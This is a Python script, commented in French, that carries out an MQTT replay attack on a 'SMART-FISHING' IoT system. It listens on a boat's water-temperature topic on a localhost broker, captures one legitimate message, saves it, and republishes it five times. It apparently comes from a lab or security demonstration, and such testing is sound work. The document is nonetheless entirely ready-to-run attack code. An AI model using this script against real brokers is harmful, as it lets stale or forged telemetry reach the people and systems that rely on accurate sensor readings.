#!/usr/bin/env python3
"""
Script de Replay MQTT — SMART-FISHING
Capture un message légitime puis le rejoue AUTOMATIQUEMENT
"""

import paho.mqtt.client as mqtt
import json
import time
import sys
import os

# Configuration
BROKER = "localhost"
PORT = 1883
TOPIC_CAPTURE = "fishing/boat/BT-Abi-01/water_temp"

# Fichier pour stocker le message capturé
CAPTURE_FILE = "/tmp/mqtt_replay_message.txt"

# Nombre de rejeux
REPLAY_COUNT = 5

captured_message = None

def on_connect_capture(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] Connecté au broker pour capture ✅")
        print(f"[*] En attente d'un message sur {TOPIC_CAPTURE}...")
        client.subscribe(TOPIC_CAPTURE)
    else:
        print(f"[-] Échec de connexion, code: {rc}")

def on_message_capture(client, userdata, msg):
    global captured_message
    captured_message = msg.payload.decode()
    print(f"\n[+] Message capturé ✅")
    print(f"[D] Topic: {msg.topic}")
    print(f"[D] Payload: {captured_message}")
    
    # Sauvegarder
    with open(CAPTURE_FILE, "w") as f:
        f.write(captured_message)
    print(f"[+] Message sauvegardé dans {CAPTURE_FILE}")
    
    client.disconnect()
    
    # ⬇️ REPLAY AUTOMATIQUE
    print("\n" + "="*50)
    print("[*] REPLAY AUTOMATIQUE EN COURS...")
    print("="*50 + "\n")
    
    # Lire le message sauvegardé
    with open(CAPTURE_FILE, "r") as f:
        message = f.read().strip()
    print(f"[*] Message à rejouer: {message}")
    
    # Replay
    replay_client = mqtt.Client()
    replay_client.connect(BROKER, PORT, 60)
    replay_client.loop_start()
    time.sleep(1)
    
    print(f"\n[*] Rejeu de {REPLAY_COUNT} messages...")
    for i in range(REPLAY_COUNT):
        replay_client.publish(TOPIC_CAPTURE, message)
        print(f"[{i+1}/{REPLAY_COUNT}] Message rejoué ✅")
        time.sleep(1)
    
    replay_client.loop_stop()
    replay_client.disconnect()
    print("\n[+] Attaque de replay terminée ✅")
    
    sys.exit(0)

print("[*] Lancement du replay automatique...")
print("[*] Publiez un message sur le topic pour le capturer\n")

client = mqtt.Client()
client.on_connect = on_connect_capture
client.on_message = on_message_capture
client.connect(BROKER, PORT, 60)
client.loop_forever()
